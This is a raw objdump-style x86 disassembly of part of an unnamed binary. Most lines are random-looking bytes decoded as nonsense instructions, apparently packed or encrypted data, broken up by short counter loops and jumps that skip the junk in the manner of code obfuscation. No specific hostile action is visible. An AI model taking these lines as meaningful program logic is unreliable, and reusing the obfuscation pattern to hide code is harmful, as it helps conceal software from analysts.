  4074bf:	add    al,BYTE PTR [eax-0x62]
  4074c2:	xlat   BYTE PTR ds:[ebx]
  4074c3:	es (bad) 
  4074c6:	jo     0x4074de
  4074c8:	dec    esi
  4074c9:	mov    DWORD PTR [ebp-0x6a2f463b],0xf0642571
  4074d3:	inc    ebp
  4074d4:	scas   al,BYTE PTR es:[edi]
  4074d5:	aam    0x87
  4074d7:	xor    ebp,DWORD PTR [edx+0x37e04343]
  4074dd:	xchg   edx,eax
  4074de:	leave  
  4074df:	dec    esi
  4074e0:	adc    bl,BYTE PTR [ecx-0x29]
  4074e3:	pusha  
  4074e4:	(bad)  
  4074e5:	rcr    BYTE PTR [esi+0x6f398a99],cl
  4074eb:	loop   0x4074de
  4074ed:	cs xor eax,0xb1d9cac
  4074f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074f4:	test   eax,0x12d1fc69
  4074f9:	adc    BYTE PTR [ebx-0x72],0x44
  4074fd:	out    dx,eax
  4074fe:	scas   al,BYTE PTR es:[edi]
  4074ff:	push   edi
  407500:	and    BYTE PTR [edi-0x7976f1e1],al
  407506:	scas   eax,DWORD PTR es:[edi]
  407507:	sub    BYTE PTR [eax],0xf1
  40750a:	mov    ecx,0xa2e6d6c3
  40750f:	aaa    
  407510:	std    
  407511:	mov    dl,0x2
  407513:	inc    esi
  407514:	popa   
  407515:	pop    ebp
  407516:	stos   DWORD PTR es:[edi],eax
  407517:	jle    0x4074e0
  407519:	imul   esp,ecx,0xffffffeb
  40751c:	loope  0x40750c
  40751e:	(bad)  
  40751f:	in     al,dx
  407520:	xchg   esp,eax
  407521:	inc    ebx
  407522:	shr    BYTE PTR [edx],cl
  407524:	sub    ch,dl
  407526:	mov    WORD PTR [ebp-0x63],?
  407529:	push   cs
  40752a:	rcl    DWORD PTR [edx],1
  40752c:	out    dx,al
  40752d:	jno    0x4074f9
  40752f:	mov    cl,0x83
  407531:	inc    eax
  407532:	mul    DWORD PTR [ebx-0xf]
  407535:	xor    BYTE PTR [esi],bh
  407537:	or     edi,DWORD PTR [eax]
  407539:	pop    es
  40753a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40753b:	xchg   edi,eax
  40753c:	jo     0x40755e
  40753e:	and    eax,0x6c9e497
  407543:	pop    esi
  407544:	sbb    DWORD PTR [edx+0x137e03d],edx
  40754a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40754b:	pop    esi
  40754c:	push   ds
  40754d:	push   ebx
  40754e:	mov    WORD PTR [edi+0x2481ecae],cs
  407554:	les    ebp,FWORD PTR [ebx]
  407556:	rep lods al,BYTE PTR ds:[esi]
  407558:	adc    al,0x78
  40755a:	pop    ebp
  40755b:	ds (bad) 
  40755d:	push   edi
  40755e:	sbb    al,0x7
  407560:	mov    dh,BYTE PTR [ebx]
  407562:	dec    ebp
  407563:	xchg   esi,eax
  407564:	retf   
  407565:	cmp    eax,0x97900a57
  40756a:	test   BYTE PTR [ecx+0x2f],0xc2
  40756e:	pop    ecx
  40756f:	je     0x40750d
  407571:	xchg   edi,eax
  407572:	aam    0x1e
  407574:	cdq    
  407575:	mov    ds:0xa6d3cbef,al
  40757a:	jg     0x407525
  40757c:	add    al,0x7
  40757e:	mov    ah,0x66
  407580:	xor    DWORD PTR [bx+di-0x6e],edx
  407584:	cli    
  407585:	jae    0x407599
  407587:	mov    ch,0x44
  407589:	aad    0x98
  40758b:	xchg   ebx,eax
  40758c:	sbb    eax,0x67164144
  407591:	in     al,dx
  407592:	in     al,0x12
  407594:	xchg   DWORD PTR [ecx],ebx
  407596:	and    eax,DWORD PTR [eax+0x7a5b37da]
  40759c:	mov    dl,0xff
  40759e:	pminub mm0,QWORD PTR [edi+0x34c2aebb]
  4075a5:	ins    DWORD PTR es:[edi],dx
  4075a6:	fimul  WORD PTR [eax-0x524f172]
  4075ac:	leave  
  4075ad:	stos   BYTE PTR es:[edi],al
  4075ae:	pop    esi
  4075af:	inc    esi
  4075b0:	pusha  
  4075b1:	ficomp WORD PTR [edi]
  4075b3:	and    BYTE PTR [ebx-0x78],dh
  4075b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075b7:	lods   eax,DWORD PTR ds:[esi]
  4075b8:	pop    eax
  4075b9:	xor    ch,BYTE PTR [esi+0x6a]
  4075bc:	stos   DWORD PTR es:[edi],eax
  4075bd:	dec    ecx
  4075be:	push   0x520e46b4
  4075c3:	ret    
  4075c4:	out    0xc0,al
  4075c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075c7:	js     0x407585
  4075c9:	neg    ch
  4075cb:	sbb    BYTE PTR [ecx-0x28ca95fc],dh
  4075d1:	jne    0x407577
  4075d3:	iret   
  4075d4:	adc    eax,0xc2a713fd
  4075d9:	dec    esi
  4075da:	mov    ss,WORD PTR [ebp-0x25]
  4075dd:	pusha  
  4075de:	or     eax,0x301c2fad
  4075e3:	cmp    BYTE PTR [edi-0x152f0404],bh
  4075e9:	pop    DWORD PTR [edx]
  4075eb:	and    DWORD PTR cs:[esi+0xf05276],edx
  4075f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075f3:	mov    ebx,0x16106f7a
  4075f8:	lock test BYTE PTR [edx-0x5b],ah
  4075fc:	(bad)  
  4075fd:	fsubr  st,st(1)
  4075ff:	popa   
  407600:	or     DWORD PTR [edx+0x2e],esp
  407603:	and    al,0xd1
  407605:	pop    es
  407606:	xlat   BYTE PTR ds:[ebx]
  407607:	cmp    al,0x1
  407609:	add    dl,BYTE PTR [esi+0x102d0c22]
  40760f:	mov    esp,0xb14276a5
  407614:	pop    ds
  407615:	inc    edi
  407616:	mov    cl,0x6a
  407618:	push   eax
  407619:	and    eax,0xf632072
  40761e:	test   bl,ch
  407620:	sbb    al,BYTE PTR [eax]
  407622:	add    BYTE PTR [ebx-0x17],dl
  407625:	pop    esi
  407626:	pop    ss
  407627:	add    BYTE PTR [eax],al
  407629:	and    DWORD PTR ds:0x42edcb,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42edcb
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42edcb,edx
  407647:	cmp    DWORD PTR ds:0x42edcb,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42edcb,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42eab3
  40766a:	cmp    DWORD PTR ds:0x42edcb,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42edcb
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42edcb,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	inc    edi
  4076a5:	push   0xc2412f57
  4076aa:	jle    0x40772a
  4076ac:	mov    bh,BYTE PTR [edi+0x7e]
  4076af:	jle    0x4076c4
  4076b1:	push   esp
  4076b2:	pop    eax
  4076b3:	mov    al,BYTE PTR [esi-0x76e784c9]
  4076b9:	pop    ss
  4076ba:	jge    0x407661
  4076bc:	cmp    al,0xfe
  4076be:	into   
  4076bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076c0:	imul   ecx,DWORD PTR [esi+0xb],0x1e
  4076c4:	xlat   BYTE PTR ds:[ebx]
  4076c5:	mov    eax,0x1658878a
  4076ca:	aam    0x3b
  4076cc:	das    
  4076cd:	pop    esi
  4076ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076cf:	cmp    dl,bl
  4076d1:	rol    bh,0x8e
  4076d4:	bound  ecx,QWORD PTR [ebx-0x5b]
  4076d7:	and    al,bh
  4076d9:	push   cs
  4076da:	inc    ebp
  4076db:	outs   dx,DWORD PTR ds:[esi]
  4076dc:	adc    dh,al
  4076de:	dec    ecx
  4076df:	fsub   QWORD PTR [edx-0x5493bb74]
  4076e5:	shr    DWORD PTR [ebx+esi*8-0x2414461],1
  4076ec:	inc    edi
  4076ed:	add    eax,0x6329ba42
  4076f2:	fwait
  4076f3:	mov    bl,0x3d
  4076f5:	pop    ecx
  4076f6:	pop    ecx
  4076f7:	stos   BYTE PTR es:[edi],al
  4076f8:	push   ss
  4076f9:	ss dec esp
  4076fb:	call   0xa1f562f8
  407700:	sbb    ecx,eax
  407702:	ss (bad) 
  407705:	loope  0x407721
  407707:	icebp  
  407708:	cmp    ebx,DWORD PTR [ebp-0x1c09ede3]
  40770e:	xchg   ebx,eax
  40770f:	ins    BYTE PTR es:[edi],dx
  407710:	int3   
  407711:	sahf   
  407712:	(bad)  [ebp+0x352019ae]
  407718:	test   BYTE PTR [esi],ah
  40771a:	sub    BYTE PTR ds:0xa0eddcba,cl
  407720:	or     eax,0xe1aaff6a
  407725:	stos   DWORD PTR es:[edi],eax
  407726:	stos   DWORD PTR es:[edi],eax
  407727:	enter  0xa9af,0x1
  40772b:	xchg   ebp,eax
  40772c:	push   ds
  40772d:	sbb    BYTE PTR [ebx],bh
  40772f:	sbb    edi,esi
  407731:	lods   eax,DWORD PTR ds:[esi]
  407732:	sub    BYTE PTR [edi+0x7f7049b6],0x71
  407739:	and    BYTE PTR [esp+ebp*8],dh
  40773c:	frstor [ecx+0x3e52e1e6]
  407742:	xchg   BYTE PTR [ebp-0x57fd4965],dh
  407748:	fwait
  407749:	fwait
  40774a:	jnp    0x40773a
  40774c:	adc    eax,0x67aabba4
  407751:	xor    ecx,DWORD PTR [edx+0x5f]
  407754:	or     BYTE PTR [ebp-0x32],dl
  407757:	aaa    
  407758:	xor    dl,0xb
  40775b:	xor    eax,0xbd7889f3
  407760:	cmp    BYTE PTR [ecx],bl
  407762:	sub    ecx,0x77
  407765:	and    al,0xee
  407767:	adc    dl,BYTE PTR [edi+0x5e]
  40776a:	scas   eax,DWORD PTR es:[edi]
  40776b:	sub    bl,BYTE PTR [ecx-0x336a01dd]
  407771:	fisttp WORD PTR [eax]
  407773:	in     al,dx
  407774:	adc    bh,BYTE PTR [ecx]
  407776:	in     al,dx
  407777:	out    0x89,al
  407779:	xchg   edx,eax
  40777a:	retf   0x2efe
  40777d:	(bad)
  407781:	cmp    edx,DWORD PTR [edi-0x423b79e8]
  407787:	in     al,dx
  407788:	add    al,0x36
  40778a:	dec    ebx
  40778b:	loope  0x407778
  40778d:	jne    0x407739
  40778f:	loopne 0x407718
  407791:	call   0xda0c:0x8587d751
  407798:	mov    al,0x4c
  40779a:	nop
  40779b:	sahf   
  40779c:	jno    0x407753
  40779e:	push   edx
  40779f:	in     eax,dx
  4077a0:	adc    DWORD PTR [eax-0x4e],edx
  4077a3:	imul   ecx,eax,0xffffff9d
  4077a6:	mov    ebp,DWORD PTR [ebx]
  4077a8:	mov    cl,0x61
  4077aa:	dec    esp
  4077ab:	out    0xef,eax
  4077ad:	mov    ds:0xdb0afbe6,al
  4077b2:	call   0xc000:0x18134c85
  4077b9:	mov    al,ds:0xd3211c56
  4077be:	mov    edi,0x375787c4
  4077c3:	mov    ds,ecx
  4077c5:	rol    BYTE PTR [eax],cl
  4077c7:	ds cmc 
  4077c9:	xchg   esp,eax
  4077ca:	push   esi
  4077cb:	loopne 0x407825
  4077cd:	test   eax,0xa62fc232
  4077d2:	sub    eax,0x362f909f
  4077d7:	dec    esi
  4077d8:	call   0x330:0x22467463
  4077df:	pop    edx
  4077e0:	cs popa 
  4077e2:	sahf   
  4077e3:	outs   dx,DWORD PTR ds:[esi]
  4077e4:	call   0x9ebc:0x672d9e87
  4077eb:	out    0xb,al
  4077ed:	mov    eax,0x5b2d8afa
  4077f2:	gs jbe 0x40781c
  4077f5:	outs   dx,BYTE PTR ds:[esi]
  4077f6:	dec    ebx
  4077f7:	jle    0x4077fd
  4077f9:	ror    BYTE PTR [ebx],cl
  4077fb:	cmp    DWORD PTR [eax+ecx*8-0x13],eax
  4077ff:	shr    BYTE PTR [ebp-0x48],cl
  407802:	cmp    al,0xc3
  407804:	and    eax,0x5ca28f3b
  407809:	int3   
  40780a:	and    al,0xe4
  40780c:	or     DWORD PTR [ebx+eiz*1-0x55],esp
  407810:	call   FWORD PTR [edi-0x18]
  407813:	fld    DWORD PTR [edx-0x14]
  407816:	cmp    ah,dl
  407818:	lea    esi,[eax]
  40781a:	xchg   esp,eax
  40781b:	loope  0x40780d
  40781d:	hlt    
  40781e:	enter  0x1022,0x3
  407822:	push   edi
  407823:	inc    edx
  407824:	xor    eax,esi
  407826:	jmp    0x9086:0x1c7b922a
  40782d:	cmp    DWORD PTR [esi],ebp
  40782f:	call   0x1647f77f
  407834:	clc    
  407835:	les    ebp,FWORD PTR [ebx+0x16]
  407838:	ins    BYTE PTR es:[edi],dx
  407839:	mov    al,dh
  40783b:	mov    al,0x32
  40783d:	jp     0x407826
  40783f:	or     eax,0x10cda4d0
  407844:	mov    edx,DWORD PTR [ebp-0x4]
  407847:	adc    DWORD PTR ds:0x430449,0x4304cf
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x43046d,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e7c4,0x1e
  407871:	cmp    DWORD PTR ds:0x42e7c4,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e7c4,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42eab7
  407896:	mov    edi,DWORD PTR ds:0x42e7c4
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e7c4,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42edcf
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x43043d,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x43043d
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x43043d,ebx
  4078d6:	cmp    DWORD PTR ds:0x43043d,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42ec27
  4078f1:	cmp    DWORD PTR ds:0x43043d,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	call   FWORD PTR [esi+edx*1]
  407944:	add    BYTE PTR [edx+0x7e7ec0dd],ch
  40794a:	mov    bh,BYTE PTR [edi+0x7e]
  40794d:	jle    0x4078e8
  40794f:	stos   DWORD PTR es:[edi],eax
  407950:	test   BYTE PTR [eax],ch
  407952:	xchg   ebp,eax
  407953:	test   al,0xa0
  407955:	xchg   esi,eax
  407956:	ret    
  407957:	inc    ecx
  407958:	ja     0x407903
  40795a:	inc    edi
  40795b:	pop    edx
  40795c:	or     al,0xc9
  40795e:	fnstsw ax
  407960:	push   ebx
  407961:	retf   0x7581
  407964:	sysret 
  407966:	cmp    ebp,DWORD PTR [edx-0x33365502]
  40796c:	daa    
  40796d:	retf   0xfd91
  407970:	mov    edi,DWORD PTR [ebp+0x11]
  407973:	jl     0x4079aa
  407975:	sbb    ch,BYTE PTR [ebp-0x3a]
  407978:	in     eax,dx
  407979:	jo     0x407944
  40797b:	inc    edi
  40797c:	mov    ds:0xf45efca5,al
  407981:	addr16 adc edx,ebx
  407984:	dec    esi
  407985:	pop    esi
  407986:	jne    0x407908
  407988:	scas   eax,DWORD PTR es:[edi]
  407989:	xchg   BYTE PTR [ecx-0x64],dl
  40798c:	imul   DWORD PTR [ecx-0x62]
  40798f:	call   0xe4ae8e7e
  407994:	xchg   esp,eax
  407995:	mov    WORD PTR [esi],fs
  407997:	in     eax,0x13
  407999:	ror    DWORD PTR [edx+0x262521d7],0xc6
  4079a0:	jl     0x4079f9
  4079a2:	ja     0x4079e7
  4079a4:	ficom  DWORD PTR [edi-0x22]
  4079a7:	jp     0x407a00
  4079a9:	jo     0x40799e
  4079ab:	xor    BYTE PTR [eax],0x4b
  4079ae:	scas   eax,DWORD PTR es:[edi]
  4079af:	adc    eax,0x80004f78
  4079b4:	(bad)  
  4079b5:	xor    al,0xe6
  4079b7:	sbb    DWORD PTR [esi],ebp
  4079b9:	sbb    al,0x8c
  4079bb:	sub    eax,DWORD PTR [esi+0x32]
  4079be:	sar    DWORD PTR [esi],1
  4079c0:	data16 (bad) 
  4079c2:	cld    
  4079c3:	int    0xc0
  4079c5:	xchg   edi,eax
  4079c6:	nop
  4079c7:	xchg   esp,eax
  4079c8:	dec    ecx
  4079c9:	int    0x44
  4079cb:	jecxz  0x4079fe
  4079cd:	sbb    ebp,DWORD PTR [ebx-0x2cbf62c6]
  4079d3:	out    0xe8,eax
  4079d5:	in     eax,0xbf
  4079d7:	int3   
  4079d8:	out    0x99,eax
  4079da:	aad    0xf3
  4079dc:	push   ecx
  4079dd:	out    dx,eax
  4079de:	xchg   esp,eax
  4079df:	mov    DWORD PTR [ebp+eax*4+0x45dd3a2a],ebx
  4079e6:	loope  0x4079d7
  4079e8:	mov    bh,0x7
  4079ea:	jne    0x407a50
  4079ec:	test   BYTE PTR [edi-0x50c36088],cl
  4079f2:	ja     0x407a06
  4079f4:	pop    edx
  4079f5:	aas    
  4079f6:	and    DWORD PTR [ebp+0x12a830fb],esp
  4079fc:	pop    ebp
  4079fd:	mov    ds:0xd318dce8,eax
  407a02:	dec    ecx
  407a03:	(bad)  
  407a04:	sub    esi,DWORD PTR [ecx-0x2d]
  407a07:	jle    0x4079be
  407a09:	(bad)  
  407a0a:	push   ebp
  407a0b:	out    0xc9,al
  407a0d:	cs iret 
  407a0f:	or     BYTE PTR [ebp+esi*1+0x20503df1],bl
  407a16:	cwde   
  407a17:	or     bh,al
  407a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a1a:	enter  0x5cc3,0xe5
  407a1e:	test   ebp,0xc6efa962
  407a24:	push   ss
  407a25:	mov    bh,0x24
  407a27:	(bad)  
  407a28:	add    al,BYTE PTR gs:[eax-0x1695c940]
  407a2f:	out    dx,eax
  407a30:	fsub   st(1),st
  407a32:	jge    0x407a84
  407a34:	pop    eax
  407a35:	test   bl,ah
  407a37:	aam    0xbc
  407a39:	sbb    BYTE PTR [esi],0xdd
  407a3c:	and    esi,DWORD PTR [esi]
  407a3e:	sub    dl,cl
  407a40:	pop    edx
  407a41:	xor    eax,DWORD PTR [ecx-0xe6c764c]
  407a47:	popf   
  407a48:	mov    eax,0x53aa637f
  407a4d:	out    0x50,ax
  407a50:	gs jnp 0x407a42
  407a53:	mov    ds:0x77438698,al
  407a58:	das    
  407a59:	or     BYTE PTR [edx],al
  407a5b:	mov    ch,0x91
  407a5d:	jo     0x407a53
  407a5f:	mov    ds:0xd725813e,eax
  407a64:	jecxz  0x407a8b
  407a66:	retf   0x4a1c
  407a69:	cmp    DWORD PTR [ecx-0x286a2e34],edx
  407a6f:	fsub   DWORD PTR [eax]
  407a71:	data16 and BYTE PTR [eax-0x9],cl
  407a75:	pop    eax
  407a76:	mov    eax,0x3d3916df
  407a7b:	into   
  407a7c:	repz fimul DWORD PTR [edi-0x38d09f1a]
  407a83:	jnp    0x407ad2
  407a85:	inc    edx
  407a86:	loopne 0x407a0e
  407a88:	jo     0x407a27
  407a8a:	in     eax,0x9b
  407a8c:	int    0x71
  407a8e:	addr16 call 0x14846655
  407a94:	ret    0x93ec
  407a97:	aas    
  407a98:	add    al,0x4e
  407a9a:	add    al,0xd0
  407a9c:	mov    fs,WORD PTR [ecx-0x57]
  407a9f:	sub    al,0xec
  407aa1:	xor    al,ah
  407aa3:	mov    ebp,0x1bb238b3
  407aa8:	addr16 pop esi
  407aab:	fimul  DWORD PTR [esi]
  407aad:	retf   
  407aae:	retf   0xef00
  407ab1:	cmp    esp,DWORD PTR [edi-0x95b2e78]
  407ab7:	push   ecx
  407ab8:	sub    BYTE PTR [edi],al
  407aba:	or     bl,BYTE PTR [eax-0x5798262b]
  407ac0:	and    bh,bl
  407ac2:	xor    ebp,DWORD PTR [ecx-0x104f8267]
  407ac8:	fwait
  407ac9:	pop    edx
  407aca:	test   DWORD PTR [ecx],ecx
  407acc:	and    al,0x35
  407ace:	lods   eax,DWORD PTR ds:[esi]
  407acf:	mov    eax,0xd3186c6a
  407ad4:	out    0x8b,eax
  407ad6:	iret   
  407ad7:	mov    dh,0xfb
  407ad9:	in     eax,dx
  407ada:	and    edi,ecx
  407adc:	test   BYTE PTR [eax+esi*1-0x74a436a3],0x5d
  407ae4:	lock sub ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi+0x4affd3ca]
  407b11:	xchg   BYTE PTR [ecx-0x3f],ch
  407b14:	jle    0x407b94
  407b16:	mov    bh,BYTE PTR [edi+0x7e]
  407b19:	jle    0x407afc
  407b1b:	adc    ch,bl
  407b1d:	gs push es
  407b1f:	arpl   WORD PTR ds:[ebp+0x74c23d78],sp
  407b26:	call   0x3cba0df2
  407b2b:	pop    esp
  407b2c:	xchg   ecx,eax
  407b2d:	loop   0x407ad4
  407b2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b30:	xchg   esi,eax
  407b31:	mov    bl,0xba
  407b33:	loope  0x407ba0
  407b35:	dec    esi
  407b36:	xor    DWORD PTR [ecx],0x7f
  407b39:	ffreep st(7)
  407b3b:	mov    dl,0xce
  407b3d:	into   
  407b3e:	shr    BYTE PTR [esi-0x1f3b56c1],cl
  407b44:	lock pop edx
  407b46:	cld    
  407b47:	inc    edi
  407b48:	jnp    0x407ae2
  407b4a:	(bad)  
  407b4b:	(bad)  
  407b4c:	test   al,0xf7
  407b4e:	sub    BYTE PTR [eax+0x36],ch
  407b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b52:	dec    ebx
  407b53:	leave  
  407b54:	inc    edi
  407b55:	push   es
  407b56:	sti    
  407b57:	mov    edx,0x84664e88
  407b5c:	in     al,0x76
  407b5e:	cmp    eax,0x5c95c34d
  407b63:	stos   DWORD PTR es:[edi],eax
  407b64:	jae    0x407b88
  407b66:	add    dh,BYTE PTR cs:[ebx+eiz*8+0x6e]
  407b6b:	or     DWORD PTR ss:[edx-0x32],esp
  407b6f:	je     0x407b1e
  407b71:	mov    WORD PTR [edx],ds
  407b73:	xor    al,0x9
  407b75:	cld    
  407b76:	sbb    eax,eax
  407b78:	hlt    
  407b79:	and    DWORD PTR [ebx-0x4d],edi
  407b7c:	lahf   
  407b7d:	stc    
  407b7e:	jl     0x407b26
  407b80:	push   ebp
  407b81:	(bad)  
  407b82:	add    dl,dl
  407b84:	and    DWORD PTR [edx],eax
  407b86:	pop    fs
  407b88:	sbb    al,0xa6
  407b8a:	(bad)  
  407b8b:	jl     0x407c0b
  407b8d:	and    eax,0x28e0bebb
  407b92:	jno    0x407b41
  407b94:	jne    0x407b4b
  407b96:	cld    
  407b97:	imul   BYTE PTR [ebp+0x1635bdbe]
  407b9d:	cmp    eax,0x700ae6a2
  407ba2:	retf   
  407ba3:	(bad)  
  407ba5:	and    ecx,DWORD PTR [eax-0x14]
  407ba8:	dec    ebp
  407ba9:	cmc    
  407baa:	clc    
  407bab:	mov    bl,ch
  407bad:	scas   eax,DWORD PTR es:[edi]
  407bae:	pop    edx
  407baf:	or     al,0xd0
  407bb1:	test   ax,0x1c42
  407bb5:	ret    
  407bb6:	jmp    FWORD PTR [ebx]
  407bb8:	adc    eax,eax
  407bba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bbb:	test   BYTE PTR [ebp-0x6c5c1677],ah
  407bc1:	jmp    0x22830584
  407bc6:	and    ebp,esp
  407bc8:	and    ecx,DWORD PTR [eax-0x5ddbc2be]
  407bce:	mov    gs,ebp
  407bd0:	jge    0x407b9b
  407bd2:	or     eax,0x419359ff
  407bd7:	mov    esi,edi
  407bd9:	pop    edi
  407bda:	aam    0x90
  407bdc:	pop    ebp
  407bdd:	dec    esi
  407bde:	ja     0x407baa
  407be0:	mov    esi,DWORD PTR [edx]
  407be2:	enter  0xef83,0x58
  407be6:	push   edx
  407be7:	xor    DWORD PTR [edx+0x16b8215f],ebp
  407bed:	ja     0x407be4
  407bef:	pop    ds
  407bf0:	xchg   esp,eax
  407bf1:	fld    QWORD PTR [ebx]
  407bf3:	xchg   esi,eax
  407bf4:	fs jmp 0x407b8b
  407bf7:	push   ecx
  407bf8:	lock inc ebx
  407bfa:	jmp    0x407c44
  407bfc:	sub    cl,BYTE PTR [ebx-0x25]
  407bff:	nop
  407c00:	ret    0xe755
  407c03:	adc    eax,0x6bea4410
  407c08:	pop    ebx
  407c09:	inc    esp
  407c0a:	xchg   ebx,eax
  407c0b:	pop    ecx
  407c0c:	lds    eax,FWORD PTR [eax-0x412f0ad7]
  407c12:	xor    DWORD PTR [ecx-0x1c],ebp
  407c15:	jo     0x407be7
  407c17:	mov    ebx,0x82442eeb
  407c1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c1e:	clc    
  407c1f:	cdq    
  407c20:	mov    DWORD PTR [edi],esp
  407c22:	pop    es
  407c23:	imul   BYTE PTR [ebp+0x4ba3cda0]
  407c29:	mov    eax,ds:0xe59e9860
  407c2e:	nop
  407c2f:	xchg   esi,eax
  407c30:	and    al,0x5f
  407c32:	jne    0x407c8b
  407c34:	add    BYTE PTR [edx-0x582ad0cc],cl
  407c3a:	(bad)  
  407c3e:	dec    eax
  407c3f:	sbb    eax,0xa7b5995d
  407c44:	fsubr  QWORD PTR [ebp+0x76]
  407c47:	out    0xcc,eax
  407c49:	and    DWORD PTR [edx+0x725f7e40],eax
  407c4f:	iret   
  407c50:	jno    0x407beb
  407c52:	cdq    
  407c53:	imul   ebx
  407c55:	outs   dx,BYTE PTR ds:[esi]
  407c56:	cmp    BYTE PTR ds:0x7315563c,ch
  407c5c:	ficom  WORD PTR [esi+esi*8+0x4e]
  407c60:	sbb    al,0x4c
  407c62:	dec    esi
  407c63:	arpl   bx,dx
  407c65:	imul   ecx
  407c67:	pop    ebp
  407c68:	and    DWORD PTR [ebx+0x14dd7f6f],edi
  407c6e:	clc    
  407c6f:	jg     0x407c7c
  407c71:	cdq    
  407c72:	sbb    eax,0x78e59926
  407c77:	cmp    dl,BYTE PTR [esi+0x76]
  407c7a:	cmc    
  407c7b:	rol    BYTE PTR [esi-0xe],1
  407c7e:	xchg   esi,eax
  407c7f:	popf   
  407c80:	mov    esi,fs
  407c82:	mov    DWORD PTR [edi+eiz*1-0x437ae0eb],esp
  407c89:	or     BYTE PTR [edx+0x72],dh
  407c8c:	dec    eax
  407c8d:	stos   BYTE PTR es:[edi],al
  407c8e:	xchg   ebx,eax
  407c8f:	sbb    al,dl
  407c91:	(bad)  
  407c92:	shl    BYTE PTR [edx+0x71],0x52
  407c96:	out    0x8b,al
  407c98:	xchg   BYTE PTR [eax-0xd],cl
  407c9b:	jl     0x407c37
  407c9d:	ss call 0x5cd80d84
  407ca3:	js     0x407d03
  407ca5:	cwde   
  407ca6:	pop    ds
  407ca7:	icebp  
  407ca8:	mov    dh,0xc2
  407caa:	push   edi
  407cab:	loope  0x407c76
  407cad:	push   ebp
  407cae:	xor    edx,eax
  407cb0:	xor    edi,eax
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax+0x672ec60e]
